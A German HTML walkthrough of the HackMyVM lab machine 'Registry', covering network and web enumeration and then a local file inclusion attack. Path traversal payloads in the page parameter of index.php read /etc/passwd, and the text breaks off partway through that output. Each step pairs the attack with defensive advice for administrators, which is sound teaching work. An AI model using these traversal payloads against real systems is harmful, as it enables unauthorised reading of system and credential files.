<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registry - HackMyVM - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>

    <div class="header-bg">
        <h1>Registry - HackMyVM - Level: Hard - Bericht</h1>
        <div class="level-container hard"> <!-- Klasse 'hard' für CSS-Farbanpassung -->
            <h2>Hard</h2> <!-- Kein Inline Style, Farbe kommt von CSS über .level-container.hard h2 -->
            <div class="circle">
                <div class="segment segment-1"></div> <!-- Farben per CSS für .hard .segment-X -->
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div> <!-- Hintergrundfarbe per CSS für .hard .inner -->
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">vi</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">gobuster</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">grep</div>
                <div class="tool-item">wfuzz</div>
                <div class="tool-item">stty</div>
                <div class="tool-item">id</div>
                <div class="tool-item">sudo</div>
                <div class="tool-item">ls</div>
                <div class="tool-item">cd</div>
                <div class="tool-item">checksec</div>
                <div class="tool-item">gdb-peda</div>
                <div class="tool-item">python3</div>
                <div class="tool-item">pwntools</div>
                <div class="tool-item">socket</div>
                <div class="tool-item">nc</div>
                <div class="tool-item">find</div>
                <div class="tool-item">base64</div>
                <div class="tool-item">sponge</div>
                <div class="tool-item">msf-pattern_create</div>
                <div class="tool-item">msfvenom</div>
                <div class="tool-item">ldd</div>
                <div class="tool-item">readelf</div>
                <div class="tool-item">nano</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept">Proof of Concept</a></li> <!-- Wird später eingefügt -->
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <p class="analysis">
                **Analyse:** Wie gewohnt beginne ich die Aufklärung mit einem Netzwerkscan, um das Zielsystem im lokalen Subnetz zu finden. Ich verwende `arp-scan -l` und filtere die Ausgabe nach Systemen mit einer "PCS" MAC-Adresse (`grep "PCS"`), was auf eine VirtualBox-VM hindeutet. Mit `awk '{print $1}'` extrahiere ich die IP-Adresse des gefundenen Systems.
            </p>
            <p class="evaluation">
                **Bewertung:** Dieser initiale Scan liefert schnell die IP-Adresse des Zielsystems (192.168.2.51). Die gezielte Suche nach "PCS" MAC-Adressen ist effektiv, um die VM in der lokalen Umgebung zu isolieren.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Starte immer mit einer soliden Netzwerkaufklärung, um das Ziel zu identifizieren und seine IP-Adresse zu bestätigen. Nutze verfügbare Hinweise (wie MAC-Adressen) zur Beschleunigung.
                <br>**Empfehlung (Admin):** Überwache dein Netzwerk auf solche Scans. Standard-MAC-Adressen-Prefixe können Angreifern helfen, VMs zu erkennen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="command">192.168.2.51</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um das Zielsystem einfacher ansprechen zu können, trage ich die gefundene IP-Adresse (192.168.2.51) zusammen mit einem Hostnamen (`registry.hmv`) in meine lokale `/etc/hosts`-Datei ein. Ich verwende den Texteditor `vi` für diese Änderung.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Hinzufügen eines Hostnamens zur lokalen `hosts`-Datei ist eine Standardpraxis, die die Lesbarkeit und Benutzerfreundlichkeit von nachfolgenden Befehlen und URLs verbessert. Es simuliert eine DNS-Auflösung für den spezifischen Hostnamen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze lokale Hostnamen, um den Überblick über deine Ziele zu behalten.
                <br>**Empfehlung (Admin):** Achte darauf, welche Hostnamen für interne Systeme verwendet werden und ob diese potenziell Hinweise auf die Systemfunktion geben könnten, falls sie nach außen gelangen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">vi /etc/hosts</span></div>
                </div>
                <div class="terminal">
                    <pre>  <span class="command">192.168.2.51    regi<span class="command">s</span>try.hm<span class="command">v</span></span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich starte einen umfassenden Nmap-Scan auf dem Zielsystem (192.168.2.51) um alle offenen Ports und Details zu den laufenden Diensten zu identifizieren. Die Optionen sind `-sS` (SYN-Scan), `-sC` (Standard-Skripte), `-sV` (Versionserkennung), `-p-` (scannt alle 65535 Ports) und `-T5` (aggressives Timing). Die Option `-AO` wird für aggressive OS-Erkennung verwendet. Die Ausgabe wird hier zunächst ungefiltert gezeigt.
            </p>
            <p class="evaluation">
                **Bewertung:** Die vollständige Nmap-Ausgabe zeigt zwei offene Ports: 22/tcp mit OpenSSH 8.9p1 (Ubuntu) und 80/tcp mit Apache httpd 2.4.52 (Ubuntu). Dies sind die Hauptangriffsflächen. Der HTTP-Titel "Coming Soon 10" auf Port 80 ist ein erster Hinweis auf den Zweck der Webanwendung. Die OS-Erkennung schätzt das System als Ubuntu oder ähnliches Linux ein, was zur SSH-Version passt. Die SSH-Hostkeys sind ebenfalls gelistet.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysiere die vollständige Nmap-Ausgabe sorgfältig auf alle Details, einschließlich Versionsinformationen, Skriptergebnisse und potenzieller OS-Hinweise.
                <br>**Empfehlung (Admin):** Halte SSH-Server und Webserver-Software aktuell, um bekannte Schwachstellen zu vermeiden. Überwache Login-Versuche und System-Logs.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.51</span></div>
                </div>
                <div class="terminal">
                    <pre>Starting Nmap 7.95 ( <span class="command">[Link: https://nmap.org | Ziel: https://nmap.org]</span> ) at 2025-06-17 14:19 CEST
Nmap <span class="command">s<span class="command">c</span><span class="command">a</span>n rep<span class="command">o</span>rt f<span class="command">o</span>r regi<span class="command">s</span>try.hm<span class="command">v</span> (192.168.2.51)</span>
<span class="command">H<span class="command">o</span><span class="command">s</span>t i<span class="command">s</span> <span class="command">u</span>p (0.00015<span class="command">s</span> l<span class="command">a</span>ten<span class="command">c</span>y).</span>
N<span class="command">o</span>t <span class="command">s</span>h<span class="command">o</span>wn: 65533 <span class="command">c</span>l<span class="command">o</span><span class="command">s</span>ed t<span class="command">c</span>p <span class="command">p<span class="command">o</span>rt<span class="command">s</span> (re<span class="command">s</span>et)</span>
<span class="command">PORT   <span class="command">S</span>T<span class="command">A</span>TE <span class="command">S</span>ERVICE VER<span class="command">S</span>I<span class="command">O</span>N</span>
<span class="command">22/t<span class="command">c</span>p <span class="command">o</span>pen  <span class="command">s</span><span class="command">s</span>h     <span class="command">O</span>pen<span class="command">S</span><span class="command">S</span>H 8.9p1 Ub<span class="command">u</span>ntu 3ub<span class="command">u</span>ntu0.1 (Ub<span class="command">u</span>ntu L<span class="command">i</span>n<span class="command">u</span>x; pr<span class="command">o</span>t<span class="command">o</span><span class="command">c</span><span class="command">o</span>l 2.<span class="command">0</span>)</span>
| <span class="command">s</span><span class="command">s</span>h-h<span class="command">o</span><span class="command">s</span>tkey:
|   256 4d:<span class="command">0</span>e:bf:5f:7<span class="command">c</span>:42:4<span class="command">a</span>:85:95:14:<span class="command">0</span>7:6<span class="command">c</span>:<span class="command">0</span>7:f8:65:<span class="command">0</span><span class="command">c</span> (ECD<span class="command">S<span class="command">A)</span></span>
|_  256 61:<span class="command">c</span>b:<span class="command">0</span>6:4<span class="command">a</span>:<span class="command">a</span>5:bf:<span class="command">a</span>2:<span class="command">a</span>f:64:<span class="command">0</span><span class="command">c</span>:9e:d4:2<span class="command">0</span>:b<span class="command">0</span>:5<span class="command">0</span>:6f (ED25519)</span>
<span class="command">80/t<span class="command">c</span>p <span class="command">o</span>pen  http    Ap<span class="command">ac</span>he httpd 2.4.52 ((Ub<span class="command">u</span>nt<span class="command">u</span>))</span>
|_http-t<span class="command">i</span>tle: <span class="command">C<span class="command">o</span>m<span class="command">i</span>ng S<span class="command">oo</span>n 1<span class="command">0</span></span>
|_http-<span class="command">s</span>er<span class="command">v</span>er-he<span class="command">a</span>der: <span class="command">Ap<span class="command">ac</span>he/2.4.52 (Ub<span class="command">u</span>nt<span class="command">u</span>)</span>
<span class="command">MAC Addre<span class="command">ss</span>: <span class="command">08:00:27:FA:D4:ED (PC<span class="command">S</span> <span class="command">S</span>y<span class="command">s</span>te<span class="command">m</span>te<span class="command">c</span>hn<span class="command">i</span>k/Or<span class="command">a</span><span class="command">c</span>le V<span class="command">i</span>rt<span class="command">u</span><span class="command">a</span>lB<span class="command">o</span>x <span class="command">v</span>irt<span class="command">u</span><span class="command">a</span>l NIC)</span></span>
De<span class="command">v</span>ice type: gener<span class="command">a</span>l p<span class="command">u</span>rp<span class="command">o</span><span class="command">s</span>e|r<span class="command">o</span>uter
<span class="command">R<span class="command">u</span>nn<span class="command">i</span>ng: L<span class="command">i</span>n<span class="command">u</span>x 4.X|5.X, Mikr<span class="command">o</span>T<span class="command">i</span>k R<span class="command">o</span>uter<span class="command">OS</span> 7.X</span>
<span class="command">OS <span class="command">CPE: <span class="command">c</span>pe:/<span class="command">o</span>:l<span class="command">i</span>n<span class="command">u</span>x:l<span class="command">i</span>n<span class="command">u</span>x_kerne<span class="command">l</span>:4 <span class="command">c</span>pe:/<span class="command">o</span>:l<span class="command">i</span>n<span class="command">u</span>x:l<span class="command">i</span>n<span class="command">u</span>x_kerne<span class="command">l</span>:5 <span class="command">c</span>pe:/<span class="command">o</span>:m<span class="command">i</span>kr<span class="command">o</span>t<span class="command">i</span>k:r<span class="command">o</span>uter<span class="command">os</span>:7 <span class="command">c</span>pe:/<span class="command">o</span>:l<span class="command">i</span>n<span class="command">u</span>x:l<span class="command">i</span>n<span class="command">u</span>x_kerne<span class="command">l</span>:5.6.3</span></span>
<span class="command">OS det<span class="command">a</span><span class="command">i</span>l<span class="command">s</span>: L<span class="command">i</span>n<span class="command">u</span>x 4.15 - 5.19, <span class="command">O</span>penWrt 21.<span class="command">0</span>2 (L<span class="command">i</span>n<span class="command">u</span>x 5.4), Mikr<span class="command">o</span>T<span class="command">i</span>k R<span class="command">o</span>uter<span class="command">OS</span> 7.2 - 7.5 (L<span class="command">i</span>n<span class="command">u</span>x 5.6.3)</span>
<span class="command">Netw<span class="command">o</span>rk Di<span class="command">s</span>t<span class="command">a</span>n<span class="command">c</span>e: 1 h<span class="command">o</span>p</span>
<span class="command">Ser<span class="command">v</span><span class="command">i</span><span class="command">c</span>e Info: <span class="command">OS</span>: L<span class="command">i</span>n<span class="command">u</span>x; <span class="command">CPE</span>: <span class="command">c</span>pe:/<span class="command">o</span>:l<span class="command">i</span>n<span class="command">u</span>x:l<span class="command">i</span>n<span class="command">u</span>x_kerne<span class="command">l</span></span>

<span class="command">TRACEROUTE</span>
<span class="command">H<span class="command">O</span>P RTT     ADDRE<span class="command">SS</span></span>
<span class="command">1   0.15 m<span class="command">s</span> regi<span class="command">s</span>try.hm<span class="command">v</span> (192.168.2.51)</span>

<span class="command">OS <span class="command">a</span>nd <span class="command">S</span>er<span class="command">v</span><span class="command">i</span><span class="command">c</span>e dete<span class="command">c</span>t<span class="command">i</span><span class="command">o</span>n perf<span class="command">o</span>r<span class="command">m</span>ed. Ple<span class="command">a</span><span class="command">s</span>e rep<span class="command">o</span>rt <span class="command">a</span>ny <span class="command">i</span>n<span class="command">c</span><span class="command">o</span>rre<span class="command">c</span>t re<span class="command">s</span>ult<span class="command">s</span> <span class="command">a</span>t <span class="command">[Link: https://nmap.org/submit/ . | Ziel: https://nmap.org/submit/].</span></span>
<span class="command">Nmap d<span class="command">o</span>ne: 1 IP <span class="command">a</span>ddre<span class="command">ss</span> (1 h<span class="command">o</span><span class="command">s</span>t <span class="command">u</span>p) <span class="command">s<span class="command">c</span><span class="command">a</span>nned in 9.6<span class="command">0</span> <span class="command">s</span>e<span class="command">c</span><span class="command">o</span>nd<span class="command">s</span></span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich filtere die Nmap-Ausgabe mit `grep open`, um schnell eine Zusammenfassung der offenen Ports zu erhalten.
            </p>
            <p class="evaluation">
                **Bewertung:** Die gefilterte Ausgabe bestätigt nochmals die offenen Ports 22 (SSH) und 80 (HTTP) mit den erkannten Versionen. Dies ist eine gute Methode, um die wichtigsten Angriffsvektoren auf einen Blick zu sehen, bevor man sich in die Details der vollständigen Nmap-Ausgabe vertieft.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze Filter wie `grep open` für eine schnelle Übersicht über die Dienste, aber verlasse dich nicht ausschließlich darauf; die vollständige Ausgabe enthält oft mehr Details.
                <br>**Empfehlung (Admin):** Prüfe die Liste der offenen Ports regelmäßig. Schließe alle Ports, die nicht aktiv genutzt werden.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.51|grep open</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="command">22/t<span class="command">c</span>p <span class="command">o</span>pen  <span class="command">s</span><span class="command">s</span>h     <span class="command">O</span>pen<span class="command">S</span><span class="command">S</span>H 8.9p1 Ub<span class="command">u</span>ntu 3ub<span class="command">u</span>ntu<span class="command">0</span>.1 (Ub<span class="command">u</span>ntu L<span class="command">i</span>n<span class="command">u</span>x; pr<span class="command">o</span>t<span class="command">o</span><span class="command">c</span><span class="command">o</span>l 2.<span class="command">0</span>)</span>
<span class="command">8<span class="command">0</span>/t<span class="command">c</span>p <span class="command">o</span>pen  http    Ap<span class="command">ac</span>he httpd 2.4.52 ((Ub<span class="command">u</span>nt<span class="command">u</span>))</span></pre>
                </div>
            </div>
        </section>

        <!-- ENDE TEIL 1 -->        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <p class="analysis">
                **Analyse:** Nach dem Portscan richte ich meine Aufmerksamkeit auf den Webserver, der auf Port 80 mit Apache httpd 2.4.52 läuft. Ich führe einen detaillierten Webserver-Scan mit `nikto` durch. `nikto -h http://registry.hmv` prüft den Host auf gängige Schwachstellen, Fehlkonfigurationen und unsichere Dateien.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Nikto-Scan liefert mehrere interessante Ergebnisse. Es fehlen die Sicherheits-Header `X-Frame-Options` und `X-Content-Type-Options`. Es gibt Hinweise auf die Preisgabe der internen IP-Adresse "127.0.1.1" über den `Location`-Header bei Anfragen an `/images` mit HTTP/1.0 (CVE-2000-0649). Die Apache-Version 2.4.52 ist veraltet. Besonders relevant sind die gefundenen Verzeichnislistungen (`Directory indexing found`) für `/css/` und `/images/`. Dies ist eine Fehlkonfiguration, die Einblicke in die Dateistruktur gibt. Die Meldung zu "junk HTTP methods" kann ein Hinweis auf Web Application Firewalls oder andere Schutzmechanismen sein, die versuchen, ungewöhnliche Anfragen zu blockieren.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze automatisierte Web-Scanner, um schnell eine erste Liste von Schwachstellen zu erhalten. Priorisiere Fehlkonfigurationen wie Verzeichnislistungen oder veraltete Software. Prüfe auf Informationslecks wie interne IP-Adressen.
                <br>**Empfehlung (Admin):** Stelle sicher, dass alle Webserver wichtige Sicherheits-Header setzen. Behebe Verzeichnislistungen (mittels Webserver-Konfiguration oder `.htaccess` mit `Options -Indexes`). Halte Webserver-Software immer auf dem neuesten Stand. Konfiguriere den Server so, dass er keine internen IPs preisgibt.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nikto -h http://registry.hmv</span></div>
                </div>
                <div class="terminal">
                    <pre>- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <span class="password">192.168.2.51</span>
+ Target Hostname:    <span class="command">192.168.2.51</span>
+ Target Port:        <span class="command">80</span>
+ Start Time:         <span class="password">2025-06-17 14:19:24 (GMT2)</span>
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <span class="command">[Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "<span class="password">127.0.1.1</span>". See: <span class="command">[Link: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed | Ziel: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed]</span>
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "<span class="password">127.0.1.1</span>". See: <span class="command">[Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649]</span>
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /css/: <span class="password">Directory indexing found.</span>
+ /css/: This might be interesting.
+ /images/: <span class="password">Directory indexing found.</span>
+ 8103 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           <span class="password">2025-06-17 14:19:47 (GMT2)</span> (23 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Zusätzlich zum Nikto-Scan führe ich einen Verzeichnis-Brute-Force-Scan mit `gobuster` auf der Ziel-Website (`http://registry.hmv`) durch. Ich verwende die Option `dir` für den Verzeichnismodus, gebe die URL an, nutze eine große Wortliste (`/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`) und füge eine lange Liste von Dateierweiterungen (`-x`) hinzu, um auch spezifische Dateien zu finden. Ich schließe bestimmte Statuscodes (`-b '503,404,403'`) aus, um Fehlerseiten oder blockierte Zugriffe zu ignorieren, erlaube erweiterte Ergebnisse (`-e`), deaktiviere Fehlermeldungen (`--no-error`) und verwende `-k` um SSL-Fehler zu ignorieren (obwohl hier kein HTTPS verwendet wird).
            </p>
            <p class="evaluation">
                **Bewertung:** Gobuster findet mehrere Verzeichnisse, darunter `/images`, `/css`, `/js`, `/javascript`, `/vendor`, `/fonts`, die mit 301 (Moved Permanently) auf sich selbst umleiten (was auf eine saubere Verzeichnisstruktur hindeutet) und die Top-Level-Dateien `index.php` und `default.php`, die mit 200 (OK) antworten. Die gefundenen Verzeichnisse `/css` und `/images` stimmen mit den Verzeichnislistungen überein, die Nikto gefunden hat. Das Vorhandensein von `.php`-Dateien (`index.php`, `default.php`) bestätigt, dass die Website PHP verwendet. Die Dateierweiterungen im Scan helfen, potenziell interessante Dateien zu finden.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Führe immer eine Verzeichnis- und Dateiaufzählung durch, um die Struktur der Webanwendung zu verstehen und versteckte Dateien/Verzeichnisse zu finden. Verwende umfangreiche Wortlisten und verschiedene Dateierweiterungen.
                <br>**Empfehlung (Admin):** Entferne alle Dateien, die nicht zwingend öffentlich zugänglich sein müssen (z.B. alte Backups, Testskripte). Überwache Webserver-Logs auf Anzeichen von Verzeichnis-Scans.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">gobuster dir -u "http://registry.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml,bak -b '503,404,403' -e --no-error -k</span></div>
                </div>
                <div class="terminal">
                    <pre>===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
<span class="password">[+] Url:                     http://registry.hmv</span>
<span class="password">[+] Method:                  GET</span>
<span class="password">[+] Threads:                 10</span>
<span class="password">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
<span class="password">[+] Negative Status codes:   503,404,403</span>
<span class="password">[+] User Agent:              gobuster/3.6</span>
<span class="password">[+] Extensions:              db,bat,java,icon,xml,svg,mod,sql,pl,pdf,desc,zip,tar,sh,csv,rtf,bak,pub,crt,c,exe,dll,raw,csh,png,kdbx,old,yaml,doc,accdb,ELF,rar,ps1,diff,php,xlsx,lib,config,ln,docx,py,elf,js.map,phtml,asp,jpg,pem,cgi,rpm,aspx,deb,gz,jpeg,json,exp,mdb,html,conf,eps,pHtml,txt,xls</span>
<span class="password">[+] Expanded:                true</span>
<span class="password">[+] Timeout:                 10s</span>
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
<span class="command">http://registry.hmv/index.php            (Status: 200) [Size: 5938]</span>
<span class="command">http://registry.hmv/images               (Status: 301) [Size: 313] [--> http://registry.hmv/images/]</span>
<span class="command">http://registry.hmv/default.php          (Status: 200) [Size: 5938]</span>
<span class="command">http://registry.hmv/css                  (Status: 301) [Size: 310] [--> http://registry.hmv/css/]</span>
<span class="command">http://registry.hmv/js                   (Status: 301) [Size: 309] [--> http://registry.hmv/js/]</span>
<span class="command">http://registry.hmv/javascript           (Status: 301) [Size: 317] [--> http://registry.hmv/javascript/]</span>
<span class="command">http://registry.hmv/vendor               (Status: 301) [Size: 313] [--> http://registry.hmv/vendor/]</span>
<span class="command">http://registry.hmv/fonts                (Status: 301) [Size: 312] [--> http://registry.hmv/fonts/]</span>

Total time: 7.854297
Processed Requests: 304
Filtered Requests: 247
Requests/sec.: 38.70492
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich untersuche die Dateinamen `index.php` und `default.php` weiter. Oft verwenden solche Dateinamen Parameter, um dynamische Inhalte zu laden, was auf lokale oder Remote File Inclusion (LFI/RFI) Schwachstellen hindeuten kann. Ich versuche, den Quellcode von `index.php` über den Browser anzusehen (`view-source:`). Der Text zeigt nur ".....", was darauf hindeutet, dass der Quellcode geprüft wurde, aber hier nicht vollständig protokolliert ist. Die Vermutung liegt nahe, dass der Quellcode einen Parameter zeigt, der Dateien inkludiert, z.B. `?page=`.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Prüfung des Quellcodes ist essentiell, um Schwachstellen in der Anwendungslogik zu finden. Das Fehlen des vollständigen Quellcodes hier ist unideal, aber die weiteren Schritte im Text deuten stark darauf hin, dass eine LFI-Schwachstelle im `page`-Parameter gefunden wurde. LFI-Schwachstellen ermöglichen es einem Angreifer, Dateien vom Zielsystem über die Webanwendung zu lesen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysiere den Quellcode von Webanwendungen (falls zugänglich) oder teste gängige Parameter (`?page=`, `?file=`, `?view=`, `?include=`, etc.) in URLs auf File Inclusion Schwachstellen. Versuche, Systemdateien (`/etc/passwd`) oder Konfigurationsdateien zu inkludieren.
                <br>**Empfehlung (Admin):** Implementiere Input-Validierung für alle Dateinamen oder Pfade, die von der Webanwendung verarbeitet werden. Verwende eine Whitelist von erlaubten Dateinamen anstelle einer Blacklist. Deaktiviere, wenn möglich, die Möglichkeit, externe URLs über Datei-Inklusions-Funktionen zu inkludieren (RFI).
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=def<span class="command">a</span>u<span class="command">l</span>t.php</span>
 .....
...</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich teste die vermutete LFI-Schwachstelle im `page`-Parameter von `index.php` indem ich versuche, die Systemdatei `/etc/passwd` zu inkludieren. Ich verwende die URL `http://registry.hmv/index.php?page=../../../../../../../etc/passwd`. Die Kette von `../` dient dazu, aus dem aktuellen Webverzeichnis in das Root-Dateisystem zu navigieren.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Meldung "hier ist alles leer, ich denke weil der server auf meine anfrage reagiert hat aber konflikte beim anzeigen entstanden sind" deutet darauf hin, dass die Anfrage vom Server verarbeitet wurde, aber die Ausgabe leer war oder einen Fehler enthielt, der nicht protokolliert wurde. Dies ist oft ein positives Zeichen bei LFI-Tests; es bedeutet, dass der Server versucht hat, die Datei zu inkludieren. Manchmal liegt es an der Anzahl der `../` oder an der Art der Zieldatei.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn ein LFI-Versuch keine Ausgabe liefert, versuche verschiedene Pfade (`../`, `....//`, URL-Kodierung) und verschiedene Zielsystemdateien (`/etc/passwd`, `/etc/hosts`, Log-Dateien). Manchmal blockieren WAFs oder Servereinstellungen bestimmte Muster oder Dateinamen.
                <br>**Empfehlung (Admin):** Implementiere eine WAF, die bekannte LFI-Muster erkennt und blockiert.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=....//....//....//....//....//....//....///et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd</span></span>
hier i<span class="command">s</span>t <span class="command">a</span>lle<span class="command">s</span> leer, <span class="command">i</span><span class="command">c</span>h denke we<span class="command">i</span>l der <span class="command">s</span>er<span class="command">v</span>er <span class="command">a</span>uf <span class="command">m</span>e<span class="command">i</span>ne <span class="command">a</span>nfr<span class="command">a</span>ge re<span class="command">a</span>g<span class="command">i</span>ert h<span class="command">a</span>t
<span class="command">a</span>ber <span class="command">c</span><span class="command">o</span>nfli<span class="command">c</span>te be<span class="command">i</span>m <span class="command">a</span>nze<span class="command">i</span>gen ent<span class="command">s</span>t<span class="command">a</span>nden <span class="command">s</span><span class="command">i</span>nd</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich versuche eine leicht modifizierte LFI-Payload-Struktur: `file:///....//....//....//....//....//....//....//etc/passwd`. Die Verwendung des `file:///` Protokolls und einer anderen Anzahl/Struktur von Verzeichnis-Durchläufen (`....//` statt `../`) kann manchmal Firewalls oder unzureichende Filter umgehen.
            </p>
            <p class="evaluation">
                **Bewertung:** Fantastisch! Diese modifizierte LFI-Payload funktioniert und die Ausgabe zeigt den **kompletten Inhalt der `/etc/passwd` Datei**! Dies bestätigt eine funktionierende Local File Inclusion-Schwachstelle. Ich kann nun beliebige Dateien auf dem Dateisystem lesen, auf die der Webserver-Benutzer (`www-data`) Zugriff hat. Die `/etc/passwd` Datei listet alle Benutzerkonten auf dem System auf (root, daemon, www-data, gato, user, cxdxnt etc.).
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Experimentiere mit verschiedenen LFI-Payloads (Nullbytes, Kodierungen, Wrappern wie `php://filter`, verschiedene Traversalschemata wie `....//`), wenn die offensichtlichsten nicht funktionieren. Erfolgreiche LFI ist eine kritische Schwachstelle.
                <br>**Empfehlung (Admin):** Behebe LFI-Schwachstellen umgehend. Überprüfe den Code, der Benutzereingaben zur Dateiinclusion verwendet, sehr sorgfältig.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=f<span class="command">i</span>le:///....//....//....//....//....//....//....///et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd</span></span>

<span class="command">r<span class="command">o</span><span class="command">o</span>t:x:<span class="command">0</span>:<span class="command">0</span>:r<span class="command">o</span><span class="command">o</span>t:/r<span class="command">o</span><span class="command">o</span>t:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</span>
<span class="command">d<span class="command">a</span>e<span class="command">m<span class="command">o</span>n:x:1:1:d<span class="command">a</span>e<span class="command">m<span class="command">o</span>n:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span></span>
